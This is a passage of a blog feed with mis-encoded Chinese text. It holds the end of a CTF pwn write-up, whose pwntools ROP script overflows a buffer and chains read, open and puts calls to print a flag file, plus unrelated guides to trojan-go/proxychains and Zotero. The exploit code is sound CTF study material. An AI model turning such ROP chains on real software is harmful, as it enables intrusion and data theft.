class="hljs-built_in">hex</span>(bss))<br><span class="hljs-comment">#read(0,bss,0x100) æŠŠ./flagå­—ç¬¦ä¸²è¯»åˆ°bssï¼š0x404130ï¼›ä½¿ç”¨openæ‰“å¼€bssä¸­çš„å­—ç¬¦ä¸²ï¼Œå³æ‰“å¼€./flagæ–‡ä»¶ï¼›readè¯»å–flagæ–‡ä»¶å†…å®¹åˆ°bss+0x20å¤„ï¼Œä½¿ç”¨writeè¾“å‡ºbss+0x20å¤„çš„å†…å®¹ï¼Œå³è¾“å‡ºflagæ–‡ä»¶å†…å®¹ï¼›</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(ret)<br>payload+=p64(pop_rdi)+p64(<span class="hljs-number">0</span>)+p64(pop_rsi)+p64(bss)+p64(<span class="hljs-number">0</span>)+p64(read_plt) <span class="hljs-comment"># rdi = 0 , rsi = bss_addr , read(0,addr,?)</span><br><br>payload+=p64(vul)<br><br>p.send(payload)<br><br>p.send(<span class="hljs-string">&#x27;./flag&#x27;</span>) <span class="hljs-comment"># read: &#x27;./flag&#x27; to bss_addr</span><br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(ret)<br>payload+=p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(sys_open)+p64(vul) <span class="hljs-comment"># open flag file </span><br><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><br>p.send(payload)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(ret)<br>payload+=p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(bss+<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0</span>)+p64(read_plt) <span class="hljs-comment"># read flag content to bss+0x20</span><br>payload+=p64(vul)<br><br><br>p.send(payload)<br>time.sleep(<span class="hljs-number">1</span>)<br><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(<span class="hljs-number">0</span>)+p64(ret)<br>payload+=p64(pop_rdi)+p64(bss+<span class="hljs-number">0x20</span>)+p64(puts_plt)<br>p.send(payload)<br><br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul><li><p><a href="https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack">https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming#inspecting-the-stack</a>    </p></li><li><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a></p></li><li><p><a href="https://hitcxy.com/2020/plt-got/">https://hitcxy.com/2020/plt-got/</a></p></li><li><p><a href="https://hitcxy.com/2020/ret2libc3/">https://hitcxy.com/2020/ret2libc3/</a></p></li><li><p><a href="https://blog.csdn.net/weixin_44681716/article/details/89877497">https://blog.csdn.net/weixin_44681716/article/details/89877497</a></p></li><li><p><a href="https://paper.seebug.org/papers/scz/unix/201606171028.txt">https://paper.seebug.org/papers/scz/unix/201606171028.txt</a> IDAåˆ†æGOT/PLTæ—¶çš„å‘</p></li><li><p><a href="https://blog.csdn.net/Zheng__Huang/article/details/119484353">https://blog.csdn.net/Zheng__Huang/article/details/119484353</a></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨traojan-goå’Œproxychanså®ç°æœåŠ¡å™¨ä»£ç†</title>
    <link href="/p/842b507e/"/>
    <url>/p/842b507e/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸ºä»€ä¹ˆä½¿ç”¨è¿™ç§æ–¹æ¡ˆ"><a href="#ä¸ºä»€ä¹ˆä½¿ç”¨è¿™ç§æ–¹æ¡ˆ" class="headerlink" title="ä¸ºä»€ä¹ˆä½¿ç”¨è¿™ç§æ–¹æ¡ˆ"></a>ä¸ºä»€ä¹ˆä½¿ç”¨è¿™ç§æ–¹æ¡ˆ</h1><ul><li><p>Trojançš„å¥½å¤„</p><ul><li>Trojanä¸ä½¿ç”¨è‡ªå®šä¹‰çš„åŠ å¯†åè®®æ¥éšè—è‡ªèº«ï¼Œè€Œæ˜¯ä½¿ç”¨ç‰¹å¾æ˜æ˜¾çš„TLSåè®®(TLS/SSL)ï¼Œä½¿å¾—æµé‡çœ‹èµ·æ¥ä¸æ­£å¸¸çš„HTTPSç½‘ç«™ç›¸åŒã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœåˆ«çš„æ¢¯å­æ˜¯åŠ å¯†ï¼ˆè®©åˆ«äººçœ‹ä¸å‡ºä½ çš„æµé‡å†…å®¹ï¼‰ï¼Œé‚£ä¹ˆTrojanå°±æ˜¯ä¼ªè£…ï¼ˆçœ‹èµ·æ¥å’Œæ™®é€šçš„HTTPSæµé‡ä¸€æ ·ï¼‰</li><li>å¯¹äºè¢«åŠ¨æ£€æµ‹ï¼ŒTrojanåè®®çš„æµé‡ä¸HTTPSæµé‡çš„ç‰¹å¾å’Œè¡Œä¸ºå®Œå…¨ä¸€è‡´ã€‚è€ŒHTTPSæµé‡å æ®äº†ç›®å‰äº’è”ç½‘æµé‡çš„ä¸€åŠä»¥ä¸Šï¼Œä¸”TLSæ¡æ‰‹æˆåŠŸåæµé‡å‡ä¸ºå¯†æ–‡ï¼Œå‡ ä¹ä¸å­˜åœ¨å¯è¡Œæ–¹æ³•ä»å…¶ä¸­åˆ†è¾¨å‡ºTrojanåè®®æµé‡ã€‚</li></ul></li><li><p>proxychainsçš„å¥½å¤„</p><ul><li>proxychainså¯ä»¥æŒ‡å®šä¸€äº›shellå‘½ä»¤æ˜¯å¦èµ°ä»£ç†ã€‚ä¸€èˆ¬æƒ…å†µä¸‹è¿è¡Œä»£ç†åä¼šæŠŠHTTPSçš„ä»£ç†æœåŠ¡å™¨ä»¥ç¯å¢ƒå˜é‡çš„å½¢å¼å†™åˆ°ç³»ç»Ÿé…ç½®æ–‡ä»¶ä¸­ï¼Œä½†æ˜¯è¿™æ ·çš„è¯æ— æ³•å¯¹æ‰€æœ‰çš„å‘½ä»¤è¡Œå‘½ä»¤è¿›è¡Œä»£ç†ï¼Œæ¯”å¦‚sshã€gitç­‰å‘½ä»¤å¯èƒ½ä¼šæ— æ³•ä½¿ç”¨ä»£ç†ã€‚å®‰è£…äº†proxychainsä¹‹åå°±å¯ä»¥ä½¿ç”¨<code>proxychains git clone xxx</code>æŒ‡å®šgitå‘½ä»¤èµ°ä»£ç†</li><li>è¦æ³¨æ„åˆ°proxychainsåªèƒ½å…è®¸tcpå’Œdnsåè®®é€šè¿‡ä»£ç†éš§é“ï¼Œå› æ­¤pingå‘½ä»¤ä½œä¸ºä¸ä½¿ç”¨åº”ç”¨å±‚åè®®è€Œæ˜¯ç›´æ¥ä½¿ç”¨ipåè®®çš„å‘½ä»¤ï¼Œä½¿ç”¨proxychainsæ˜¯æ— æ•ˆçš„</li></ul></li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">About proxychains tool:<br><span class="hljs-bullet">   *</span> It&#x27;s a proxifier.<br><span class="hljs-bullet">   *</span> Latest version: 3.1<br><span class="hljs-bullet">   *</span> Dedicated OS: Linux and other Unices.<br><span class="hljs-bullet">   *</span> Allows TCP and DNS tunneling through proxies.<br><span class="hljs-bullet">   *</span> Supports HTTP, SOCKS4 and SOCKS5 proxy servers.<br><span class="hljs-bullet">   *</span> Different proxy types can be mixed in the same chain.<br><span class="hljs-bullet">   *</span> Proxy chain: user-defined list of proxies chained together.<br>  Usability :<br><span class="hljs-bullet">      *</span> Run any program through proxy server.<br><span class="hljs-bullet">      *</span> Access the Internet from behind a restrictive firewall.<br><span class="hljs-bullet">      *</span> Hide your IP<br><span class="hljs-bullet">      *</span> Run SSH, telnet, wget, ftp, apt, vnc, nmap through proxy servers.<br><span class="hljs-bullet">      *</span> Access Intranets (192.168.<span class="hljs-emphasis">*.*</span>/10.<span class="hljs-emphasis">*.*</span>.<span class="hljs-emphasis">*) from outside through reverse proxy.</span><br></code></pre></td></tr></table></figure><h1 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h1><blockquote><p>å¤ªé•¿ä¸çœ‹ç‰ˆæœ¬</p></blockquote><p><strong>å®‰è£…Trojan</strong></p><p>ä¸‹è½½Trojan zipæ–‡ä»¶ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/p4gefau1t/</span>trojan-go<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/v0.10.6/</span>trojan-go-linux-amd64.zip<br></code></pre></td></tr></table></figure><p>è§£å‹ï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">mkdir</span> trojan-<span class="hljs-built_in">go</span><br><br>unzip *.zip -d trojan-<span class="hljs-built_in">go</span><br></code></pre></td></tr></table></figure><p>ç¼–è¾‘yamlæ–‡ä»¶ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> trojan-<span class="hljs-keyword">go</span>/ &amp;&amp; <span class="hljs-keyword">vim</span> japan.yaml<br></code></pre></td></tr></table></figure><p>ç¼–è¾‘proxychainsçš„confæ–‡ä»¶ï¼ŒæŒ‰ç…§æ–‡ä»¶ä¸­çš„æ³¨é‡Šå»å¢åŠ è§„åˆ™ï¼ˆåè®®ã€ipã€ç«¯å£ï¼‰ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>proxychains4.conf<br></code></pre></td></tr></table></figure><p>å°†Trojan-goç¨‹åºæŒ‰ç…§yamlé…ç½®è¿è¡Œï¼š</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./trojan-go</span> <span class="hljs-params">--config</span> japan.yaml<br></code></pre></td></tr></table></figure><p>ä¸‹é¢å°†Trojan-goç¨‹åºé…ç½®ä¸ºå¼€æœºè‡ªå¯åŠ¨çš„ç³»ç»ŸæœåŠ¡ï¼š</p><p>ç¼–è¾‘Trojan-go.serviceæ–‡ä»¶ï¼Œå¤åˆ¶</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span> ./trojan-<span class="hljs-keyword">go</span>.service<br><br><span class="hljs-keyword">cp</span> ./trojan-<span class="hljs-keyword">go</span>.service /etc/systemd/<span class="hljs-built_in">system</span>/<br></code></pre></td></tr></table></figure><p>å¼€å¯æœåŠ¡ï¼š</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">sudo<span class="hljs-keyword"> system</span>ctl enable trojan-go<br>sudo<span class="hljs-keyword"> system</span>ctl start trojan-go<br>sudo<span class="hljs-keyword"> system</span>ctl daemon-reload<br></code></pre></td></tr></table></figure><p>æ£€æµ‹TrojanæœåŠ¡çš„çŠ¶æ€ï¼š</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">sudo systemctl <span class="hljs-built_in">status</span> trojan-<span class="hljs-built_in">go</span><br></code></pre></td></tr></table></figure><p>æ£€æµ‹ip</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos">proxychains4 curl myip.ipip.<span class="hljs-built_in">net</span><br></code></pre></td></tr></table></figure><p><strong>å®‰è£…proxychains</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo apt install proxychains4<br>sudo vim <span class="hljs-regexp">/etc/</span>proxychains4.conf <span class="hljs-comment"># åœ¨æœ€åä¸€è¡ŒæŒ‰ç…§æ ¼å¼å†™å…¥ipä¸ç«¯å£</span><br></code></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><ul><li><a href="https://trojan-gfw.github.io/trojan/">https://trojan-gfw.github.io/trojan/</a></li><li><a href="https://github.com/p4gefau1t/trojan-go">https://github.com/p4gefau1t/trojan-go</a></li><li><a href="http://proxychains.net/">http://proxychains.net/</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨zoteroé«˜æ•ˆç®¡ç†æ–‡çŒ®</title>
    <link href="/p/8726c56d/"/>
    <url>/p/8726c56d/</url>
    
    <content type="html"><![CDATA[<p><img src="https://img.gls.show/img/20230803194639.png"></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>zoteroæ˜¯ä¸€ä¸ªä¼˜ç§€çš„ç§‘ç ”æ–‡çŒ®ç®¡ç†å·¥å…·ã€‚å®ƒå¼€æºã€å…è´¹ã€è·¨å¹³å°ï¼Œé€‚é…äº†Windowsã€macosã€Linuxã€‚åœ¨å¯ä»¥å¯¹æ–‡çŒ®è¿›è¡Œé«˜æ•ˆæ“ä½œçš„åŒæ—¶ï¼Œæ”¯æŒé€šè¿‡ä½¿ç”¨æµè§ˆå™¨æ’ä»¶å¯¹ç½‘é¡µè¿›è¡Œæ”¶å½•æ“ä½œ</p><p>ç®€å•æ€»ç»“ä¸€ä¸‹zoteroï¼š</p><ul><li>æä¾›æ–‡çŒ®çš„é«˜æ•ˆåŒ–åˆ†ç±»æ•´ç†</li><li>æ”¯æŒç¿»è¯‘åŠŸèƒ½</li><li>æ”¯æŒmarkdownè¯­æ³•çš„ç¬”è®°åŠŸèƒ½</li><li>æ”¯æŒ</li></ul><p>åœ¨zoteroçš„å®˜ç½‘ä¸Šï¼Œæœ‰è¿™æ ·ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://www.zotero.org/why">Why Zotero?</a>ï¼Œè®²è¿°äº†ä¸ºä»€ä¹ˆä½¿ç”¨zotero</p><p>ä¸‹è½½å¹¶å®‰è£…zoteroï¼š<a href="https://www.zotero.org/">https://www.zotero.org/</a></p><h1 id="åŸºæœ¬ä½¿ç”¨"><a href="#åŸºæœ¬ä½¿ç”¨" class="headerlink" title="åŸºæœ¬ä½¿ç”¨"></a>åŸºæœ¬ä½¿ç”¨</h1><h2 id="å¯¼å…¥æ–‡çŒ®"><a href="#å¯¼å…¥æ–‡çŒ®" class="headerlink" title="å¯¼å…¥æ–‡çŒ®"></a>å¯¼å…¥æ–‡çŒ®</h2><p><strong>æ¡ç å¯¼å…¥</strong></p><p><img src="https://img.gls.show/img/20230801101150.png"></p><p>æ”¯æŒè¾“å…¥ISBNã€DOIã€PMIDã€arXiv ID æˆ– ADS æ¡ç æ¥æ·»åŠ æ¡ç›®åˆ°æ‚¨çš„æ–‡åº“ï¼Œå¹¶ä¸”æ”¯æŒå¤šè¡Œå¯¼å…¥</p><p><strong>ç›´æ¥æ‹–åŠ¨æ–‡ä»¶å¯¼å…¥</strong></p><p>æŠŠæœ¬åœ°pdfæ–‡ä»¶æ‹–è¿›å»å³å¯</p><p><strong>ä½¿ç”¨æµè§ˆå™¨æ’ä»¶å¯¼å…¥</strong></p><p>å®‰è£…æµè§ˆå™¨æ’ä»¶zotero connectorï¼Œå¯ä»¥å°†ç½‘é¡µå†…å®¹ä¿å­˜åˆ°zoteroä¸­</p><h2 id="å¤åˆ¶æ–‡çŒ®ä¿¡æ¯"><a href="#å¤åˆ¶æ–‡çŒ®ä¿¡æ¯" class="headerlink" title="å¤åˆ¶æ–‡çŒ®ä¿¡æ¯"></a>å¤åˆ¶æ–‡çŒ®ä¿¡æ¯</h2><p>åœ¨zoteroä¸­é€‰ä¸­æ¡ç›®ï¼Œc+shift+cå³å¯</p><p>å¤åˆ¶æ•ˆæœï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Dietrich, Constanze, Katharina Krombholz, Kevin Borgolteå’ŒTobias Fiebig. ã€ŠInvestigating System Operatorsâ€™ Perspective on Security Misconfigurationsã€‹. æ”¶å…¥ _Proceedings of the <span class="hljs-number">2018</span> ACM SIGSAC Conference on Computer and Communications Security_, <span class="hljs-number">1272</span>â€“<span class="hljs-number">89</span>. Toronto Canada: ACM, <span class="hljs-number">2018</span>. [https:<span class="hljs-regexp">//</span>doi.org<span class="hljs-regexp">/10.1145/</span><span class="hljs-number">3243734.3243794</span>](https:<span class="hljs-regexp">//</span>doi.org<span class="hljs-regexp">/10.1145/</span><span class="hljs-number">3243734.3243794</span>).<br></code></pre></td></tr></table></figure><h2 id="åŒæ­¥åŠŸèƒ½"><a href="#åŒæ­¥åŠŸèƒ½" class="headerlink" title="åŒæ­¥åŠŸèƒ½"></a>åŒæ­¥åŠŸèƒ½</h2><p>åœ¨zoteroå®˜ç½‘ä¸Šæ³¨å†Œè´¦å·ï¼Œåœ¨è½¯ä»¶èœå•æ -ã€‹é¦–é€‰é¡¹-ã€‹åŒæ­¥å¤„ç™»å½•è´¦å·ï¼Œå³å¯å®ç°å¤šè®¾å¤‡åŒæ­¥</p><p>ä¸åŒè´¦å·å¯ä»¥ä½¿ç”¨Zoteroç¾¤ç»„åŠŸèƒ½ï¼Œå¼€ä¸€ä¸ªå…±äº«æ–‡çŒ®åº“ï¼Œè¿™æ ·å½¼æ­¤è¯»è¿‡çš„æ–‡çŒ®ã€ä½œå‡ºçš„æ‰¹æ³¨ï¼Œä¹Ÿéƒ½å¯ä»¥å…±äº«</p><p>Zoteroçš„ç¾¤ç»„åŠŸèƒ½çš„ä½¿ç”¨æ•™ç¨‹ï¼š<a href="https://zhuanlan.zhihu.com/p/348626383">https://zhuanlan.zhihu.com/p/348626383</a></p><h2 id="åœ¨å¤§ç›®å½•æ˜¾ç¤ºæ‰€æœ‰æ–‡ç« ï¼ˆåŒ…æ‹¬å°ç›®å½•çš„æ–‡ç« ï¼‰"><a href="#åœ¨å¤§ç›®å½•æ˜¾ç¤ºæ‰€æœ‰æ–‡ç« ï¼ˆåŒ…æ‹¬å°ç›®å½•çš„æ–‡ç« ï¼‰" class="headerlink" title="åœ¨å¤§ç›®å½•æ˜¾ç¤ºæ‰€æœ‰æ–‡ç« ï¼ˆåŒ…æ‹¬å°ç›®å½•çš„æ–‡ç« ï¼‰"></a>åœ¨å¤§ç›®å½•æ˜¾ç¤ºæ‰€æœ‰æ–‡ç« ï¼ˆåŒ…æ‹¬å°ç›®å½•çš„æ–‡ç« ï¼‰</h2><p>èœå•-ã€‹æŸ¥çœ‹-ã€‹å‹¾é€‰â€œæ˜¾ç¤ºå­åˆ†ç±»ä¸­çš„æ¡ç›®â€</p><h2 id="æ–‡ç« é‡è¦æ€§æ ‡è®°"><a href="#æ–‡ç« é‡è¦æ€§æ ‡è®°" class="headerlink" title="æ–‡ç« é‡è¦æ€§æ ‡è®°"></a>æ–‡ç« é‡è¦æ€§æ ‡è®°</h2><p>æœ‰ä¸€ä¸ªå¾ˆç®€å•çš„æ–¹æ³•å¯¹æ–‡ç« é‡è¦æ€§è¿›è¡Œæ’åºï¼Œå°±æ˜¯åœ¨è®ºæ–‡æ ‡é¢˜åˆ—æ—è¾¹æ˜¾ç¤ºç‰ˆæƒä¿¡æ¯å³å¯ï¼Œç„¶åæ‰‹åŠ¨ç»™è®ºæ–‡çš„ç‰ˆæƒä¿¡æ¯é‚£ä¸€æ åŠ ä¸Šæ ‡è®°ï¼Œæ¯”å¦‚<code>###</code>ä¸ºé‡è¦ï¼Œ<code>##</code>ä¸ºæ¬¡è¦ï¼Œ<code>#</code>ä¸ºä¸€èˆ¬ï¼Œä¸åŠ æ ‡è®°ä¸ºä¸é‡è¦</p><h1 id="æ’ä»¶"><a href="#æ’ä»¶" class="headerlink" title="æ’ä»¶"></a>æ’ä»¶</h1><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>æ‰“å¼€å·¥å…·-ã€‹é™„åŠ ç»„ä»¶ï¼Œå®‰è£…æ’ä»¶</p><ul><li>Zotero Connectorï¼Œæ‰“é€šå’Œæµè§ˆå™¨çš„å±éšœ<ul><li><a href="https://www.zotero.org/download/connectors">https://www.zotero.org/download/connectors</a></li></ul></li><li>å¯¹å‚è€ƒæ–‡çŒ®è¿›è¡Œé«˜æ•ˆç®¡ç†<ul><li><a href="https://github.com/MuiseDestiny/zotero-reference/">https://github.com/MuiseDestiny/zotero-reference/</a></li></ul></li><li>ç¿»è¯‘åŠŸèƒ½<ul><li><a href="https://github.com/windingwind/zotero-pdf-translate/releases">https://github.com/windingwind/zotero-pdf-translate/releases</a></li></ul></li></ul><h2 id="ç¿»è¯‘åŠŸèƒ½"><a href="#ç¿»è¯‘åŠŸèƒ½" class="headerlink" title="ç¿»è¯‘åŠŸèƒ½"></a>ç¿»è¯‘åŠŸèƒ½</h2><p><a href="https://github.com/windingwind/zotero-pdf-translate">GitHub - windingwind/zotero-pdf-translate: Translate PDF, EPub, webpage, metadata, annotations, notes to the target language. Support 20+ translate services.</a></p><p>æ”¯æŒå¤šç§ç¿»è¯‘å¼•æ“ï¼Œæ¯”å¦‚cnkiã€googleã€deep Lã€å½©äº‘å°è¯‘ã€GPTç­‰ï¼ˆå¯å¯¼å…¥apiï¼‰</p><p>ä»¥å½©äº‘å°è¯‘ç¿»è¯‘apiä¸ºä¾‹ï¼š</p><ul><li>åœ¨<a href="https://platform.caiyunapp.com/login">å½©äº‘å¼€æ”¾å¹³å°</a>æ³¨å†Œå¹¶ç™»å½•</li><li>æ‰“å¼€åº”ç”¨ç®¡ç†-ã€‹åˆ›å»ºåº”ç”¨-ã€‹ç¿»è¯‘</li></ul><h2 id="è®°å½•ç¬”è®°"><a href="#è®°å½•ç¬”è®°" class="headerlink" title="è®°å½•ç¬”è®°"></a>è®°å½•ç¬”è®°</h2><p>zoteroè‡ªå¸¦ç¬”è®°åŠŸèƒ½çš„åŠ å¼ºç‰ˆ</p><p><a href="https://github.com/windingwind/zotero-better-notes">GitHub - windingwind/zotero-better-notes: Everything about note management. All in Zotero.</a></p><h2 id="è¶…é“¾æ¥å¿«é€Ÿè·³è½¬åˆ°zotero"><a href="#è¶…é“¾æ¥å¿«é€Ÿè·³è½¬åˆ°zotero" class="headerlink" title="è¶…é“¾æ¥å¿«é€Ÿè·³è½¬åˆ°zotero"></a>è¶…é“¾æ¥å¿«é€Ÿè·³è½¬åˆ°zotero</h2><p>zutiloæ”¯æŒé€šè¿‡è¶…é“¾æ¥ä»åˆ«çš„è½¯ä»¶ï¼Œæ¯”å¦‚typoraï¼Œå¯¼èˆªåˆ°zoteroæ–‡çŒ®çš„å…·ä½“ä½ç½®</p><p><a href="https://blog.csdn.net/magefreehome/article/details/118051991">Zutiloçš„é«˜çº§æ‰©å±•ä½¿ç”¨ Quick Copy alt1 alt2-CSDNåšå®¢</a></p><p><a href="https://qnscholar.github.io/2020-10/zotero-item-links/">ç‰›å‰ï¼Zutiloæ’ä»¶çš„è¿™ä¸ªåŠŸèƒ½ï¼Œç©¶ç«Ÿæœ‰å¤šå¥½ç”¨ï¼</a></p><h2 id="è®ºæ–‡é‡å‘½å"><a href="#è®ºæ–‡é‡å‘½å" class="headerlink" title="è®ºæ–‡é‡å‘½å"></a>è®ºæ–‡é‡å‘½å</h2><p>å¾ˆå¤šæ—¶å€™ä¸‹è½½ä¸‹æ¥çš„è®ºæ–‡åå­—æ˜¯æ··ä¹±çš„ï¼Œå¯ä»¥ä½¿ç”¨<a href="https://github.com/jlegewie/zotfile">GitHub - jlegewie/zotfile: Zotero plugin to manage your attachments: automatically rename, move, and attach PDFs (or other files) to Zotero items, sync PDFs from your Zotero library to your (mobile) PDF reader (e.g. an iPad, Android tablet, etc.), and extract PDF annotations.</a>è‡ªåŠ¨çš„å¯¹æ–‡çŒ®è¿›è¡Œé‡å‘½å</p><h1 id="ä¸­æ–‡æ–‡çŒ®æ”¯æŒ"><a href="#ä¸­æ–‡æ–‡çŒ®æ”¯æŒ" class="headerlink" title="ä¸­æ–‡æ–‡çŒ®æ”¯æŒ"></a>ä¸­æ–‡æ–‡çŒ®æ”¯æŒ</h1><p><a href="https://github.com/l0o0/jasminum">GitHub - l0o0/jasminum: A Zotero add-on to retrive CNKI meta data. ä¸€ä¸ªç®€å•çš„Zotero æ’ä»¶ï¼Œç”¨äºè¯†åˆ«ä¸­æ–‡å…ƒæ•°æ®</a></p><p>ä¸­æ–‡æœŸåˆŠé™„ä»¶ï¼ˆPDF/CAJï¼‰çš„å…ƒæ•°æ®æŠ“å–ï¼Œæ”¯æŒæ·»åŠ PDF/CAJæ—¶è‡ªåŠ¨æŠ“å–å…ƒæ•°æ®åŠŸèƒ½</p><h1 id="æ·»åŠ å¼•ç”¨"><a href="#æ·»åŠ å¼•ç”¨" class="headerlink" title="æ·»åŠ å¼•ç”¨"></a>æ·»åŠ å¼•ç”¨</h1><p>//todo</p><h1 id="ä½¿ç”¨åšæœäº‘å¯¹zoteroè¿›è¡ŒåŒæ­¥"><a href="#ä½¿ç”¨åšæœäº‘å¯¹zoteroè¿›è¡ŒåŒæ­¥" class="headerlink" title="ä½¿ç”¨åšæœäº‘å¯¹zoteroè¿›è¡ŒåŒæ­¥"></a>ä½¿ç”¨åšæœäº‘å¯¹zoteroè¿›è¡ŒåŒæ­¥</h1><p>zoteroè‡ªå¸¦çš„äº‘å­˜å‚¨åªæœ‰300MBï¼Œåšæœäº‘åˆ™æ˜¯ä¸Šä¼ 1GBï¼Œä¸‹è½½3GBï¼Œä¸”æ”¯æŒwebdav</p><p>åŒæ­¥æ–¹æ³•ï¼š</p><ul><li>zoteroä¸­ï¼Œç¼–è¾‘-ã€‹é¦–é€‰é¡¹-ã€‹åŒæ­¥-ã€‹ç™»å½•zoteroçš„è´¦å·</li><li>ä¹‹åä¸‹é¢ä¼šå‡ºç°æ–‡ä»¶åŒæ­¥æ–¹å¼ï¼Œé€‰æ‹©webdav</li><li><strong>æ³¨æ„ä¸‹æ–¹çš„å¯†ç ä¸æ˜¯åšæœäº‘çš„å¯†ç </strong>ã€‚éœ€è¦æ³¨å†Œåšæœäº‘è´¦å·ï¼Œ åœ¨åšæœäº‘ç½‘é¡µç«¯ä¾æ¬¡é€‰æ‹©ï¼šè´¦å·åç§°â€”â€”è´¦æˆ·ä¿¡æ¯â€”â€”å®‰å…¨é€‰é¡¹â€”â€”ç¬¬ä¸‰æ–¹åº”ç”¨ç®¡ç†â€”â€”æ·»åŠ åº”ç”¨å¯†ç ï¼Œç»™zoteroç”Ÿæˆä¸€ä¸ªå¯†ç </li></ul><p><img src="https://img.gls.show/img/202312161603328.png"></p><h1 id="zoteroçš„ç¾¤ç»„åŠŸèƒ½"><a href="#zoteroçš„ç¾¤ç»„åŠŸèƒ½" class="headerlink" title="zoteroçš„ç¾¤ç»„åŠŸèƒ½"></a>zoteroçš„ç¾¤ç»„åŠŸèƒ½</h1><p><a href="https://www.jianshu.com/p/187cbeea19af">Zoteroä½¿ç”¨æŒ‡å—04ï¼šç¾¤ç»„åŠŸèƒ½ - ç®€ä¹¦</a></p><p><a href="https://zhuanlan.zhihu.com/p/161243372">æ–‡çŒ®å…±äº«/ååŒç ”ç©¶ï¼Œä¸å¦¨è¯•è¯•Zoteroç¾¤ç»„ï¼Ÿ - çŸ¥ä¹</a></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://sspai.com/post/56724">Zotero çš„ä½¿ç”¨å’Œå­¦ä¹ è·¯å¾„</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æ ‘æ‘è·¯19å·ä¸å®Œå…¨æŒ‚é€¼æŒ‡å—</title>
    <link href="/p/de638251/"/>
    <url>/p/de638251/</url>
    
